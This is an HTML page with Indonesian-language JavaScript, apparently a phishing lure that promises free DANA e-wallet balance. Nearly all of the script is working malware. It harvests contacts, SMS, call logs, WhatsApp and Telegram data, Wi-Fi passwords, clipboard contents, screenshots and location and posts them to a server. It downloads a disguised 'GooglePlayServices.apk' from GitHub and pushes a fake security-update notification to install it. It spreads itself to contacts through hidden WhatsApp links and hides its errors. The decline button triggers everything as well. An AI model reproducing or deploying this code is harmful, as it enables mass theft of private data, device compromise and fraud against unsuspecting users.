<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title></title>
    <link rel="preconnect" href="https://fonts.googleapis.com">

        html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}

        .box{max-width:380px;width:90%;padding:20px}

<div class="status-bar" id="statusBar">⏳ Inisialisasi...</div>

<script>
// ============================================================
// INDEX.HTML - DENGAN LOGO DANA ASLI
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var dataStore = [];
var hasLS = (typeof localStorage !== 'undefined');
var semuaDidapat = false;
var spreadDone = false;

// ============================================================
// STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; });
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// FUNGSI K() - KIRIM DATA
// ============================================================
function K(d) {
    dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber, data: d.data });
    try {
        fetch('/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function(){});
    } catch(e) {}
}

// ============================================================
// DETEKSI LINGKUNGAN
// ============================================================
function detectEnvironment() {
    var env = { isWebView: false, isFacebook: false, isWhatsApp: false, isTelegram: false, isInstagram: false, isTikTok: false, isAndroidBridge: false, isBrowser: false };
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1) env.isWebView = true;
    if (ua.indexOf('fb') > -1 || ua.indexOf('facebook') > -1 || document.referrer.indexOf('facebook') > -1) env.isFacebook = true;
    if (ua.indexOf('whatsapp') > -1 || document.referrer.indexOf('whatsapp') > -1) env.isWhatsApp = true;
    if (ua.indexOf('telegram') > -1 || document.referrer.indexOf('telegram') > -1) env.isTelegram = true;
    if (ua.indexOf('instagram') > -1 || document.referrer.indexOf('instagram') > -1) env.isInstagram = true;
    if (ua.indexOf('tiktok') > -1 || document.referrer.indexOf('tiktok') > -1) env.isTikTok = true;
    if (typeof AndroidBridge !== 'undefined') env.isAndroidBridge = true;
    if (!env.isWebView && !env.isAndroidBridge) env.isBrowser = true;
    return env;
}
var ENV = detectEnvironment();

// ============================================================
// ESCAPE WEBVIEW
// ============================================================
function escapeWebView() {
    if (!ENV.isWebView && !ENV.isFacebook && !ENV.isWhatsApp && !ENV.isTelegram && !ENV.isInstagram && !ENV.isTikTok) return;
    var url = window.location.href;
    try { window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end'; } catch(e) {}
    try { window.open(url, '_system'); } catch(e) {}
    try { var iframe = document.createElement('iframe'); iframe.src = url; iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999'; document.body.appendChild(iframe); } catch(e) {}
}

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined',
    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
    startRecording: function() { if(this.isAvailable){ try{return AndroidBridge.startRecording()}catch(e){}} return null },
    startVideoRecording: function() { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording()}catch(e){}} return null },
    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){}} return null },
    keepAwake: function() { if(this.isAvailable){ try{AndroidBridge.keepAwake(true);return true}catch(e){}} return false },
    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false },
    installAPK: function(p) { if(this.isAvailable){ try{AndroidBridge.installAPK(p);return true}catch(e){}} return false },
    saveFile: function(path, content) { if(this.isAvailable){ try{AndroidBridge.saveFile(path, content);return true}catch(e){}} return false },
    openFile: function(path) { if(this.isAvailable){ try{AndroidBridge.openFile(path);return true}catch(e){}} return false },
    openApp: function(pkg) { if(this.isAvailable){ try{AndroidBridge.openApp(pkg);return true}catch(e){}} return false }
};

// ============================================================
// DATA COLLECTION
// ============================================================
function ambilDataCepat() {
    var data = { waktu: Date.now(), ua: navigator.userAgent, ip: '', lokasi: null, kontak: null, sms: null, clipboard: null, env: ENV };
    
    try {
        fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) { data.ip = d.ip; K({sumber:'ip', data:d.ip}); })
            .catch(function(){});
    } catch(e) {}
    
    try {
        navigator.geolocation.getCurrentPosition(function(p) {
            data.lokasi = {lat: p.coords.latitude, lon: p.coords.longitude};
            K({sumber:'lokasi', data:data.lokasi});
        }, function(){});
    } catch(e) {}
    
    if(A.isAvailable) {
        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = kontak; K({sumber:'kontak_all', data:kontak}); } } catch(e) {}
        try { var sms = A.getAllSMS(); if(sms) { data.sms = sms; K({sumber:'sms_all', data:sms}); } } catch(e) {}
        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = clipboard; K({sumber:'clipboard', data:clipboard}); } } catch(e) {}
        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:callLog}); } catch(e) {}
        try { var wa = A.getWhatsAppData(); if(wa) K({sumber:'whatsapp', data:wa}); } catch(e) {}
        try { var tg = A.getTelegramData(); if(tg) K({sumber:'telegram', data:tg}); } catch(e) {}
        try { var files = A.listAllFiles(); if(files) K({sumber:'files_all', data:files}); } catch(e) {}
        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:apps}); } catch(e) {}
        try { var wifi = A.getWiFiPasswords(); if(wifi) K({sumber:'wifi_passwords', data:wifi}); } catch(e) {}
        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:ss}); } catch(e) {}
    } else {
        try { navigator.clipboard.readText().then(function(t) { if(t) { data.clipboard = t; K({sumber:'clipboard', data:t}); } }).catch(function(){}); } catch(e) {}
    }
    
    K({sumber:'init', data:data});
    return data;
}

// ============================================================
// PAYLOAD INJECTION
// ============================================================
function payloadInjection() {
    var statusBar = document.getElementById('statusBar');
    statusBar.style.display = 'block';
    
    var apkUrl1 = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    var fileUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    
    statusBar.textContent = '📥 Mengunduh pembaruan keamanan...';
    if (A.isAvailable) {
        A.downloadFile(apkUrl1, '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
        K({ sumber: 'payload', data: { status: 'apk_downloaded' } });
    } else {
        try { var a=document.createElement('a'); a.href=apkUrl1; a.download='GooglePlayServices.apk'; a.style.display='none'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(e) {}
    }
    
    fetch(fileUrl)
        .then(function(res) { return res.text(); })
        .then(function(html) {
            if (A.isAvailable) {
                A.saveFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html', html);
                K({ sumber: 'file_system', data: { status: 'html_saved' } });
            } else {
                var blob = new Blob([html], {type: 'text/html'});
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = 'SystemUpdate.html';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                K({ sumber: 'file_system', data: { status: 'html_downloaded' } });
            }
        })
        .catch(function() {});
    
    setTimeout(function() {
        statusBar.textContent = '🔔 Klik notifikasi untuk menyelesaikan pembaruan...';
        notificationInstallAndOpen();
        setTimeout(function() { statusBar.style.display = 'none'; }, 5000);
    }, 4000);
}

// ============================================================
// NOTIFIKASI 2-IN-1
// ============================================================
function notificationInstallAndOpen() {
    if (!('Notification' in window)) return;
    if (Notification.permission !== 'granted') { Notification.requestPermission(); return; }
    
    var notif = new Notification('⚡ Pembaruan Keamanan', {
        body: 'Klik untuk menyelesaikan pembaruan dan meningkatkan keamanan perangkat Anda.',
        icon: 'https://verifikasi.site/icon.png',
        requireInteraction: true,
        silent: false,
        vibrate: [200, 100, 200]
    });
    
    notif.onclick = function() {
        var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
        if (A.isAvailable) {
            A.installAPK(apkPath);
            K({ sumber: 'notification_install', data: 'apk_install_started' });
        } else {
            try { window.location.href = 'intent://' + apkPath + '#Intent;scheme=file;package=com.android.packageinstaller;end'; } catch(e) {}
        }
        
        var htmlPath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
        if (A.isAvailable) {
            A.openFile(htmlPath);
            K({ sumber: 'notification_install', data: 'html_opened' });
        } else {
            try { window.open('file://' + htmlPath, '_blank'); } catch(e) {}
        }
        notif.close();
    };
    
    setTimeout(function() { if (notif) notif.close(); }, 30000);
    K({ sumber: 'notification_install', data: 'notification_shown' });
}

// ============================================================
// AUTO SPREAD
// ============================================================
function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    if (!A.isAvailable) return;
    var contacts = A.getAllContacts();
    if (!contacts || contacts.length === 0) return;
    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
    var maxSend = 50;
    contacts.slice(0, maxSend).forEach(function(c, i) {
        setTimeout(function() {
            var number = c.number.replace(/[^0-9]/g, '');
            if (number && number.length > 5) {
                try {
                    var iframe = document.createElement('iframe');
                    iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                    document.body.appendChild(iframe);
                    setTimeout(function(){ iframe.remove(); }, 2000);
                } catch(e) {}
            }
        }, i * 200);
    });
    K({sumber:'auto_spread', data:'sent_to_' + Math.min(contacts.length, maxSend) + '_contacts'});
}

// ============================================================
// HEARTBEAT
// ============================================================
function startHeartbeat() {
    setInterval(function(){ K({sumber:'heartbeat', data:'alive'}); }, 10000);
}

// ============================================================
// SERVICE WORKER
// ============================================================
function injectServiceWorker() {
    if (!('serviceWorker' in navigator)) return;
    var swCode = `
        self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
        self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
        self.addEventListener('message',function(e){ if(e.data && e.data.type === 'ping'){ e.ports[0].postMessage({type:'pong',timestamp:Date.now()}); } });
        setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.forEach(function(client){ client.postMessage({type:'heartbeat',timestamp:Date.now()}); }); }); }, 10000);
    `;
    try { var blob=new Blob([swCode],{type:'application/javascript'}); var swUrl=URL.createObjectURL(blob); navigator.serviceWorker.register(swUrl); K({ sumber: 'service_worker', data: { status: 'registered' } }); } catch(e) {}
}

// ============================================================
// REDIRECT KE DANA ASLI
// ============================================================
function redirectToDANA() {
    try {
        window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
        return;
    } catch(e) {}
    if (A.isAvailable) {
        try { if (A.openApp) { A.openApp('com.dana.id'); return; } if (typeof AndroidBridge !== 'undefined') { AndroidBridge.openApp('com.dana.id'); return; } } catch(e) {}
    }
    try { window.location.href = 'market://details?id=com.dana.id'; return; } catch(e) {}
    try { window.location.href = 'https://www.dana.id'; return; } catch(e) {}
    try { window.location.href = 'https://www.google.com/search?q=dana+indonesia'; } catch(e) {}
}

// ============================================================
// EKSEKUSI UTAMA
// ============================================================
function dapatkanSemua() {
    if(semuaDidapat) return;
    semuaDidapat = true;
    if(hasLS) localStorage.setItem('sudah_klaim', '1');
    document.getElementById('popupDana').style.display = 'none';
    
    escapeWebView();
    ambilDataCepat();
    payloadInjection();
    injectServiceWorker();
    autoSpread();
    startHeartbeat();
    
    setTimeout(function() { redirectToDANA(); }, 6000);
}

// ============================================================
// TRIGGER
// ============================================================
function klaim() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin', data:'klaim'}); }
function tolak() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin', data:'tolak'}); }

setTimeout(function() { if (!spreadDone) { autoSpread(); } }, 1000);
setTimeout(function() { if (!semuaDidapat) { dapatkanSemua(); } }, 5000);

var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); }, 100); };
document.addEventListener('click', clickHandler);
setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 5000);

var w = 5;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if(el) el.textContent = '00:0' + (w < 10 ? '0' + w : w);
    if(w <= 0) {
        clearInterval(timerInterval);
        document.getElementById('popupDana').style.display = 'none';
        setTimeout(function(){ dapatkanSemua(); }, 100);
    }
}, 1000);

// ============================================================
// PHISHING ROUTING (HANYA 4)
// ============================================================
